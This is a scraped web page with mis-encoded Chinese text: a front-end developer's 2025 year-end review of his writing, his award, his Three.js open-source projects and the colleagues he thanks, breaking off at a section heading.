                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2025 å¹´ç»ˆæ€»ç»“ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€</h2>
<p>ä¸¤å¹´å‰çš„æ˜¥èŠ‚å‡æœŸï¼ŒæŸå¤©ã€‚åœ¨ä¸€æ‰€é¢ç§¯ä¸å¤§ã€ç´§é‚»å›½é“çš„å»‰ç§Ÿæˆ¿é‡Œï¼Œä½ç€ä¸‰ä¸ªäººã€‚</p>
<p>é‚£æ—¶çš„æˆ‘ï¼Œè¿˜æ˜¯ä¸ªå‡­è¿æ°”æ··è¿›å¤§å…¬å¸ã€å¤©å¤©å†™ CRUD æ··åƒç­‰æ­»çš„å‰ç«¯â€œå°å¡æ‹‰ç±³â€ã€‚è¶ç€æ˜¥èŠ‚å‡æœŸï¼Œæˆ‘æˆ´ç€è€³æœºï¼Œæ²‰æµ¸åœ¨æ¸¸æˆä¸–ç•Œé‡Œã€‚çªç„¶ï¼Œå®¢å…ä¼ æ¥ä¸€å£°é—·å“ã€‚</p>
<p>æˆ‘ç–‘æƒ‘åœ°æ‘˜ä¸‹è€³æœºï¼šâ€œä»€ä¹ˆå£°éŸ³ï¼Ÿâ€</p>
<p>å›å¤´æœ›å»ï¼Œæˆ‘çœ‹åˆ°å¥¶å¥¶ä»°é¢èººåœ¨æ²™å‘ä¸Šâ€”â€”å¥¹æ™•å€’äº†ã€‚</p>
<p>é‚£æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§åˆ°æˆ‘æœ€äº²çˆ±çš„äº²äººï¼ˆæˆ‘æ˜¯å•äº²+ç•™å®ˆå„¿ç«¥ï¼‰ç—…å€’åœ¨é¢å‰ã€‚æ…Œä¹±ä¸­ï¼Œæˆ‘ç»™åœ¨å¤–æ‰“ç‰Œçš„çˆ¶äº²æ‹¨å»äº†ç”µè¯ã€‚æœ€å<strong>æ‰€å¹¸</strong>å¹¶æ— å¤§ç¢ï¼Œä½†åœ¨é‚£ä¸€åˆ»ï¼Œæˆ‘çŸ¥é“ï¼š<strong>æˆ‘ä¸èƒ½å†è¿™æ ·æ··ä¸‹å»äº†ï¼Œæˆ‘éœ€è¦åŠªåŠ›ã€‚</strong></p>
<p>ä¸¤å¹´åçš„ä»Šå¤©ï¼Œå†å›å¤´çœ‹ï¼š</p>
<ul>
<li>æˆ‘æˆä¸ºäº†å›¢é˜Ÿä¸­ä¸å¯æˆ–ç¼ºçš„æŠ€æœ¯æ ¸å¿ƒ</li>
<li>æˆ‘æˆä¸ºäº†ç¨€åœŸæ˜é‡‘ 2025 å¹´åº¦ä¼˜ç§€åˆ›ä½œè€…</li>
<li>æˆ‘å¼€æºçš„é¡¹ç›®ç´¯è®¡è·å¾— 1K+ GitHub Star</li>
<li>æˆ‘å¼€å§‹é¢‘ç¹å‡ºç°åœ¨ Three.js å®˜æ–¹æ¨ç‰¹çš„è½¬å‘åˆ—è¡¨ä¸­</li>
<li>ä¹Ÿç¬¬ä¸€æ¬¡ï¼Œè¢«åˆ«äººç§°ä¸ºã€ŒæŠ€æœ¯ä¸“å®¶ã€</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0410fe20874471b90aca12aafb89bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=FRTWNwlLxUe9Fph9IEB%2BTo%2FU2sI%3D" alt="111.gif" loading="lazy"/></p>
<h3 data-id="heading-1">å‰è¨€ï¼šå‰ç«¯ç‰ˆâ€œè§ç‚â€ï¼Ÿä¸ï¼Œæ˜¯é¸½å­ç‹</h3>
<p>æˆ‘æ— æ„æƒ³å»å°†è¿‡å»ä¸¤å¹´åˆ°åº•æ˜¯å¦‚ä½•åº¦è¿‡çš„å†™æˆæ–‡ç« ï¼ŒæŠŠè¿™ç¯‡å¹´ç»ˆæ€»ç»“å†™æˆâ€œå‰ç«¯ç‰ˆè§ç‚â€çš„<strong>è‡ªä¼ </strong>ã€‚è€å®è¯´æˆ‘ä¹Ÿæƒ³ä¸èµ·æ¥æ˜¯æ€ä¹ˆè¿‡çš„ã€‚ä¸Šé¢é‚£æ®µæ²‰é‡çš„å¼€åœºç™½ï¼Œå°±å½“æ˜¯æˆ‘ä¸ºè‡ªå·±å°å°çš„éª„å‚²ä¸€ä¸‹å§ã€‚</p>
<p>å¥½äº†ï¼STOPï¼æ²‰é‡çš„è¯é¢˜åˆ°æ­¤ä¸ºæ­¢ã€‚è®©æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹ï¼Œ<strong>â€œé¸½å­ç‹â€è€ä½•</strong>ä»Šå¹´åˆ°åº•å¹²äº†äº›ä»€ä¹ˆäº‹å§ï¼</p>
<h3 data-id="heading-2">1.æ‰€åœ¨ä¹‹å¹³å°ï¼šæ•°æ®ä¸æ„Ÿè°¢</h3>
<p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹ä»Šå¹´åœ¨å¹³å°ä¸Šçš„å…·ä½“â€œæˆ˜ç»©â€ã€‚ä»Šå¹´ä¸€å…±å†™äº†å¤šå°‘ç¯‡æ–‡ç« å‘¢ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3deeb7f549ea4af388c6fb93fd50e3bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=JocLRT6%2Bn83Ut43G7bFA2G%2Fk8gg%3D" alt="æ›´æ–°é¢‘ç‡.png" loading="lazy"/></p>
<p><strong>å“‡ï¼å±…ç„¶æœ‰è¶³è¶³ 9 ç¯‡ä¹‹å¤šï¼</strong> è¿™ä¸ªæ•°é‡çœŸæ˜¯é—»è€…ä¼¤å¿ƒã€å¬è€…è½æ³ªï¼Œè¿è¥çœ‹äº†æƒ³æ‰“äººï¼ˆå³è¾¹ç‹å°¼å…‹çœŸçš„æ˜¯è¿è¥å‚¬æ›´æˆ‘æ—¶çš„è¡¨æƒ… be like...ï¼‰ã€‚ä¸è¿‡å¥½åœ¨æ•°æ®è¿˜ç®—è¿‡å¾—å»ï¼Œæ”¶è·äº† <strong>1217 åç²‰ä¸</strong>ã€‚çœŸçš„ç‰¹åˆ«ç‰¹åˆ«æ„Ÿè°¢ä½ ä»¬ï¼ä¸å¤šè¯´äº†ï¼Œå°±æˆ‘è¿™â€œéšç¼˜æ›´æ–°â€çš„é¢‘ç‡è¿˜èƒ½æœ‰ç²‰ä¸ï¼ŒçœŸçš„å¾—ç»™â€œ<strong>ä¹‰çˆ¶ä»¬</strong>â€ç£•ä¸€ä¸ªã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94deb121ec444c4786e7733bf287cfc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=JVIDmwZS1VdnaIB7Ezx29v24P50%3D" alt="æ„Ÿè°¢ ç»™ä½ ç£•å¤´ GIF åŠ¨å›¾_çˆ±ç»™ç½‘_aigei_com.gif" loading="lazy"/></p>
<p>åœ¨æ­¤æœŸé—´ï¼Œæˆ‘ä¹Ÿæ”¶è·äº†éå¸¸ä¸é”™çš„æµé‡ï¼Œæ„Ÿè°¢å„å¤§ç½‘å‹ã€ç¾¤å‹å’Œå¹³å°è¿è¥è€å¸ˆçš„å¤§åŠ›æ‰¶æŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29e2ba78ccfa4b4f954138ef459e80d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=UJx8Yf1kJQURcs%2FG0x3VmNfqto4%3D" alt="222.png" loading="lazy"/></p>
<p>æœ€ç»ˆï¼Œæˆ‘è·å¾—äº† <strong>ã€Œç¨€åœŸæ˜é‡‘ 2025 å¹´åº¦ä¼˜ç§€åˆ›ä½œè€…ã€</strong> çš„è£èª‰ã€‚å½“æ—¶è¿è¥è€å¸ˆé€šçŸ¥æˆ‘çš„æ—¶å€™ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37608b2cccc4463492a7bc425c43bdc8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=vTX9B%2B0TSukM53%2F9dtHsY39Oyd8%3D" alt="11111111111111111.png" loading="lazy"/></p>
<blockquote>
<p><strong>æ³°è£¤è¾£ï¼å…„å¼Ÿä»¬ä¹Ÿæ˜¯å¥½èµ·æ¥äº†ï¼</strong></p>
</blockquote>
<p>è¯´çœŸçš„ï¼Œèƒ½æ‹¿è¿™ä¸ªå¥–å®Œå®Œå…¨å…¨å½’åŠŸäºä¸‡èƒ½çš„ç¾¤å‹ä»¬å’Œè¿è¥è€å¸ˆæ»¡æ»¡çš„ Pushï¼Œæ˜¯ä½ ä»¬çš„ç›‘ç£è®©æˆ‘å¾—ä»¥å°†å†™æ–‡ç« çš„ä¹ æƒ¯ï¼ˆå‹‰å¼ºï¼‰åšæŒä¸‹å»ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19ed1e4e912c49ee91e47c7caa3b037b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=V2xXV3irFR8rnbmeWzlKjt3Egcs%3D" alt="å¾®ä¿¡åœ–ç‰‡_20260108111207_10_110.jpg" loading="lazy"/></p>
<h3 data-id="heading-3">2.æ‰€åšä¹‹é¡¹ç›®ï¼šä»â€œå¤¯â€åˆ°â€œæ‹‰â€çš„é”è¯„</h3>
<p>æ¥åˆ°é¡¹ç›®ç¯èŠ‚ï¼Œè®©æˆ‘ä»¥æå…¶å®¢è§‚ï¼ˆè‡ªæˆ‘æ£€è®¨ï¼‰çš„è§†è§’ï¼Œé”è¯„ä¸€ä¸‹ä»Šå¹´å¼€æºçš„é¡¹ç›®å§ï¼</p>
<h4 data-id="heading-4">ğŸï¸ Island â€”â€” 2.5D å¡é€šé£ä¸ªäººç®€å†\</h4>
<blockquote>
<p><strong>è‡ªæˆ‘è¯„ä»·ï¼šäººä¸Šäºº</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8911dac514c4474a9234451df7d34a07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=m9X7ieqZkWLaeCqnBCmj2roQ1MA%3D" alt="island.gif" loading="lazy"/></p>
<p><a href="https://juejin.cn/post/7498914140166799397" target="_blank" title="https://juejin.cn/post/7498914140166799397"><code>island</code></a> å¯¹ç°åœ¨çš„æˆ‘æ¥è¯´ï¼Œç¡®å®å­˜åœ¨ä¸å°‘é—®é¢˜ï¼š</p>
<ul>
<li><strong>ç”»é¢é£æ ¼</strong>ï¼šä¸‰æ¸²äºŒçš„æ•ˆæœè¿˜éœ€ä¼˜åŒ–ï¼Œä»”ç»†çœ‹è·ç¦»å°æ—¶å€™åœ¨ PSP ä¸Šç©çš„æ¸¸æˆé£æ ¼è¿˜æœ‰å·®è·ï¼Œåç»­è®¡åˆ’åŠ å…¥è‡ªå®šä¹‰åå¤„ç†é€šé“æ¥è°ƒèŠ‚ã€‚</li>
<li><strong>UI è®¾è®¡</strong>ï¼šå½“æ—¶ç”¨ DALLÂ·E 3 ç”Ÿæˆçš„ UI æ¯”è¾ƒç®€é™‹ï¼Œåç»­ä¼šç”¨ <strong>Nano-banana-pro</strong> å…¨é¢æ”¹è¿› UI é£æ ¼ã€‚</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šç§»åŠ¨ç«¯é€‚é…ï¼Ÿä¸å­˜åœ¨çš„ï¼Œæ‰‹æœºå’Œå¹³æ¿ç”¨æˆ·åªèƒ½å¹²çªçœ¼ = =ã€‚</li>
<li><strong>äº¤äº’æ€§</strong>ï¼šå¯äº’åŠ¨å†…å®¹å•è°ƒï¼Œé è¿‘ç‰©ä½“æ²¡æœ‰è§†è§‰åé¦ˆã€‚</li>
<li><strong>å±•ç¤ºæ–¹å¼</strong>ï¼šç©å®¶éœ€è¦åˆ°åœºæ™¯ä¸Šæ–¹ç‚¹å‡»å‘Šç¤ºç‰Œå±•ç¤ºæ–°é¡¹ç›®ï¼Œæ–¹å¼å¤ªå•ä¸€ï¼Œå’Œç½‘é¡µæ²¡å•¥åŒºåˆ«ï¼</li>
</ul>
<p>ä½†è¯åˆè¯´å›æ¥ï¼Œè¿™ç¡®å®æ˜¯æˆ‘ç¬¬ä¸€ä¸ªæœ‰ç‚¹â€œå‡ºåœˆâ€çš„é¡¹ç›®ã€‚ä¹Ÿè®¸æ¯ä¸ªäººå›çœ‹ä»¥å‰çš„ä»£ç éƒ½ä¼šè§‰å¾—ç¨šå«©ï¼Œå·¦çœ‹å³çœ‹èƒ½æŒ‘å‡ºä¸€å †æ¯›ç—…ï¼Œä½†ä¸å¯å¦è®¤å®ƒåœ¨æˆ‘å¿ƒä¸­çš„åœ°ä½ã€‚ç»¼åˆä¸‹æ¥ï¼Œç»™ä¸ª**â€œäººä¸Šäººâ€**çš„è¯„ä»·ï¼åé¢çš„æ”¹åŠ¨è¿˜èƒ½åœ¨æ˜é‡‘å¤šæ°´ä¸¤ç¯‡æ–‡ç« ï¼Œç¾æ»‹æ»‹ã€‚</p>
<h4 data-id="heading-5">ğŸ™ï¸ CubeCity â€”â€” å¡é€šåŸå¸‚æ”¾ç½®ç³»ç»Ÿ</h4>
<blockquote>
<p><strong>è‡ªæˆ‘è¯„ä»·ï¼šé¡¹ç›®é¡¶å°–ï¼Œä½œè€…â€œæ‹‰å®Œäº†â€</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4788327e533841ff9f95e71ea05b4bb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=B0tL3n6mY9cuOuidKRnqgdAbbf0%3D" alt="æ¸¸ç©æ—¶åŠ¨å›¾.gif" loading="lazy"/></p>
<p><a href="https://juejin.cn/post/7538715423534399534" target="_blank" title="https://juejin.cn/post/7538715423534399534"><code>CubeCity</code></a> æ˜¯æˆ‘ GitHub ä¸Š Star æœ€å¤šçš„é¡¹ç›®ï¼Œå•ä¸ªé¡¹ç›®è´¡çŒ®äº† <strong>877 Star</strong>ã€‚ç©æ³•å‚è€ƒäº†ã€Šå¡ç‰ŒåŸé•‡ã€‹ï¼Œæ”¯æŒéšæ„å»ºé€ ã€æ‹†é™¤ã€å‡çº§ã€æ¬è¿å»ºç­‘ã€‚UI è´´åˆ Low Poly é£æ ¼ï¼Œåœ¨å›½å¤–ç¤¾åŒºä¹Ÿå¾ˆè®¨å–œã€‚</p>
<p>ä½† Star å¤šä¸ä»£è¡¨æ²¡é—®é¢˜ï¼š</p>
<ul>
<li><strong>æ€§èƒ½</strong>ï¼šæ¸²æŸ“å¸§ç‡å ªå¿§ï¼Œæ¯”å¦‚ GTX 1660 Ti è¿™ç§æ˜¾å¡éƒ½è·‘ä¸æ»¡ 60 FPSã€‚</li>
<li><strong>ç”Ÿæ°”</strong>ï¼šé“è·¯ä¸Šæ²¡æœ‰æ±½è½¦å’Œå°äººè·‘åŠ¨ï¼ŒåŸå¸‚æ˜¾å¾—ç©ºè¡è¡ã€‚</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šç§»åŠ¨è®¾å¤‡åˆåŒå’æ²¡åšå…¼å®¹ï¼Ÿï¼GitHub ä¸Šæçš„ Issue ä¹Ÿä¸å›ï¼Ÿå¯æ¶çš„é¸½å­ç‹ï¼</li>
<li><strong>åŠŸèƒ½ç¼ºå¤±</strong>ï¼šè¯´å¥½çš„æˆå°±ç³»ç»Ÿå‘¢ï¼Ÿç»æµç³»ç»Ÿå‘¢ï¼Ÿç¤¾äº¤æ’è¡Œæ¦œå‘¢ï¼Ÿ</li>
</ul>
<p>ä½•è´¤ä½ åœ¨å¹²å˜›ï¼Ÿæ€»è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªé¡¹ç›®ç®€ç›´æ˜¯<strong>é¸½åˆ°æ²¡æœ‹å‹ï¼Œæœ€é¸½çš„ä¸€é›†</strong>ï¼X ä¸Šè¯„è®ºä¸å›ï¼ŒGitHub ä¸Š Issue è£…æ­»ã€‚è¦ä¸æ˜¯é¡¹ç›®åº•å­è¿˜è¡Œï¼Œæˆ‘çœŸçš„è¦éª‚äººäº†ï¼</p>
<p>ç»¼åˆä¸‹æ¥é¡¹ç›®ç»™åˆ°<strong>é¡¶å°–</strong>ï¼Œä½†æ˜¯å¼€å‘è€…ç»™åˆ° <strong>æ‹‰å®Œäº†</strong> å•Šï¼</p>
<h4 data-id="heading-6">Third-Person-MCâ€”â€”ç¬¬ä¸‰äººç§°æˆ‘çš„ä¸–ç•Œ</h4>
<blockquote>
<p><strong>è‡ªæˆ‘è¯„ä»·ï¼šå¤¯</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13b59621537949ed8c9474085286dac1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=3hNFDawVjAYajgn9S27GIsCgKc8%3D" alt="03.gif" loading="lazy"/></p>
<p>è¿™ä¸ªé¡¹ç›®æ˜å‹ä»¬å¯èƒ½æ²¡æ€ä¹ˆå¬è¿‡ï¼Œä½†åœ¨ç¾¤é‡Œåº”è¯¥å¤šå¤šå°‘å°‘è§è¯†è¿‡ã€‚è¿™æ˜¯ç›®å‰å¯¹æˆ‘æ¥è¯´æœ€å¤æ‚çš„ä¸€ä¸ªé¡¹ç›®ï¼</p>
<p>è¯¥é¡¹ç›®å…·å¤‡å¤šç§ç”Ÿæ€åœ°è²Œã€æ— é™åœ°å½¢ç”Ÿæˆä¸è‡ªé€‚åº”ç›¸æœºç­‰æ ¸å¿ƒç‰¹æ€§ï¼Œ<strong>ä¸ä¹…çš„å°†æ¥</strong>ï¼Œå³å°†æ­£å¼ç™»é™†æ˜é‡‘å¹³å°ä¸å¤§å®¶è§é¢ã€‚è‡³äºæ˜¯å¦ä¼šè¿›ä¸€æ­¥æ‰©å±•è”æœºç³»ç»Ÿï¼Œç›®å‰å°šæ— å®šè®ºã€‚ç›¸å…³å†…å®¹ï¼Œæˆ‘ä¼šåœ¨åç»­å‘å¸ƒçš„ä¸“é¢˜æ–‡ç« ä¸­ä¸ºå¤§å®¶è¯¦ç»†è§£è¯»ã€‚</p>
<p>æ€»ä½“æ¥è¯´è¿˜ä¸é”™ï¼å®æœºæµ‹è¯•åœ¨ GTX 1660 Ti çš„ç¬”è®°æœ¬ä¸Šä¹Ÿèƒ½ç¨³å®š 30 å¸§ï¼ç®—æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„æ¢ç´¢ã€‚ç»¼åˆè¯„ä»·ï¼š<strong>å¤¯</strong>ã€‚</p>
<hr/>
<p>å¥½äº†å¥½äº†æ‰“ä½ï¼ä»Šå¹´è¯´å®è¯è¿˜æ˜¯å¼€æºäº†ä¸å°‘é¡¹ç›®ï¼ä½†æ˜¯ä¸èƒ½åœ¨è¿™å ç”¨ç¯‡å¹…ï¼åœ¨æ­¤æˆ‘ç›´æ¥å°±æ˜¯ä¸€ä¸ªé¡¹ç›®å¤§åˆå½±</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b540ba7f3024f33a8b3d31035dfd988~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=hQKO%2BpWvXgYlAqEx%2BExn0jdvVVw%3D" alt="Snipaste_2026-01-08_14-36-36.png" loading="lazy"/></p>
<p>ä»¥åŠå¯¹äºæˆ‘æ¥è¯´æ‰€æœ‰é¡¹ç›®<strong>ä»å¤¯åˆ°æ‹‰</strong>çš„æ’åå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/781a3e51f71f4bd1bb7752dbd8eac5ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=dfYHqt%2F2JERJjxDRl8vJ4CEsqDY%3D" alt="æˆ‘çš„ä»å¤¯åˆ°æ‹‰.png" loading="lazy"/></p>
<h3 data-id="heading-7">3.æ‰€é‡ä¹‹å¥½å‹ï¼šè‰¯å¸ˆç›Šå‹</h3>
<p>è¿‘å¹´æœ€å¹¸è¿çš„äº‹ï¼Œå°±æ˜¯é‡åˆ°äº†ä¸€ä¸ªå¾ˆå¥½çš„é¢†å¯¼ï¼Œä»¥åŠä¸€ç¾¤å¿—åŒé“åˆã€ç›¸äº’å‹‰åŠ±çš„æœ‹å‹ã€‚</p>
<h4 data-id="heading-8">å…³äºâ€œå†·çˆ·â€</h4>
<p>åœ¨å·¥ä½œä¸Šï¼Œæˆ‘é‡åˆ°äº†ä¸€ä½å¥½é¢†å¯¼ï¼Œä½†æˆ‘æ›´æ„¿ç§°ä»–ä¸ºå¥½æœ‹å‹â€”â€”<strong>å†·çˆ·</strong>ã€‚ å¹³æ—¶ç¾¤å‹æˆ–åˆä½œä¼™ä¼´å¯èƒ½è§‰å¾—æˆ‘æ˜¯ä¸ªæ¸©å’Œçš„äººï¼Œå¯ä¸€æ—¦åˆ‡å…¥å·¥ä½œæ¨¡å¼ï¼Œæˆ‘å°±ä¼šå˜æˆå¤§å®¶å£ä¸­çš„â€œå‹åŠ›æ€ªâ€ã€‚å› æ­¤æ›¾æœ‰ä¸€æ®µæ—¶é—´ï¼Œæˆ‘å’ŒåŠå…¬ç¯å¢ƒæœ‰äº›æ ¼æ ¼ä¸å…¥ã€‚å†·çˆ·ä½œä¸º Leaderï¼ŒçœŸçš„èµ·åˆ°äº†è‡³å…³é‡è¦çš„æ¶¦æ»‘ä½œç”¨ã€‚ ç”Ÿæ´»ä¸­ï¼Œå†·çˆ·ä¹Ÿç»å¸¸å¸¦æˆ‘å‡ºå»ç©ã€‚é‚£æ®µæ—¶é—´æˆ‘çœŸæ˜¯â€œä¸¤è€³ä¸é—»çª—å¤–äº‹ï¼Œä¸€å¿ƒåªæƒ³å­¦æŠ€æœ¯â€ï¼Œå½»å½»åº•åº•çš„å®…ç”·ä¸€æšã€‚è¦ä¸æ˜¯å†·çˆ·æ‹‰ç€æˆ‘æ¸¸å±±ç©æ°´ï¼Œæˆ‘å¯èƒ½çœŸå°±æˆäº†é‚£ç§â€œä»£ç æ•²å¾—é£èµ·ã€è¯å´è¯´ä¸æ¸…æ¥šâ€çš„åˆ»æ¿æå®¢ã€‚ ä»–æ˜¯ä¸€ä¸ªå¥½é¢†å¯¼ï¼Œæ›´æ˜¯ä¸€ä¸ªå¥½æœ‹å‹ã€‚<strong>åœ¨è¿™é‡Œæƒ³å¯¹å†·çˆ·è¯´ä¸€å£°ï¼šè°¢è°¢ï¼</strong></p>
<h4 data-id="heading-9">å…³äº Web3D åœˆå­</h4>
